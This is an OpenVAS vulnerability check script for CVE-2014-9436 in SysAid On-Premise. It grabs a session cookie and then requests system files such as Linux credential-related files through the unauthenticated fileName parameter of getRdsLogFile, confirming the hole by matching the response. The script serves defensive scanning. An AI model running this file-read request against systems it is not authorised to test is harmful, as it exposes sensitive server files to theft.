###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sysaid_file_disclosure_vuln.nasl 11831 2018-10-11 07:49:24Z jschulte $
#
# SysAid Server Arbitrary File Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:sysaid:sysaid';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105938");
  script_version("$Revision: 11831 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-01-13 16:45:50 +0700 (Tue, 13 Jan 2015)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2014-9436");

  script_name("SysAid Server Arbitrary File Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_sysaid_detect.nasl");
  script_mandatory_keys("sysaid/installed");

  script_tag(name:"summary", value:"SysAid On-Premise is prone to an arbitrary file
  disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"SysAid On-Premise is vulnerable to an unauthenticated file
  disclosure attack in the fileName parameter of getRdsLogFile.");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary files which may contain
  sensitive information.");

  script_tag(name:"affected", value:"SysAid On-Premise before 14.4.2.");

  script_tag(name:"solution", value:"Upgrade to version 14.4.2 or above.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35593/");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(item:string(dir, "/Login.jsp"), port:port);
res = http_keepalive_send_recv(port:port, data:req);
useragent = get_http_user_agent();

sessionid = eregmatch(string:res, pattern:"JSESSIONID=([^;]+)");
if (isnull(sessionid[1]))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + '/getRdsLogFile?fileName=/' + file;
  req = 'GET ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + http_host_name(port: port) + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n' +
        'Accept-Encoding: gzip, deflate\r\n' +
        'Cookie: JSESSIONID=' + sessionid[1] + '\r\n' +
        'Connection: keep-alive\r\n\r\n';

  res = http_keepalive_send_recv(port:port, data:req);

  if (res && egrep(string:res, pattern:pattern)) {
    report = report_vuln_url(url:url);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(99);
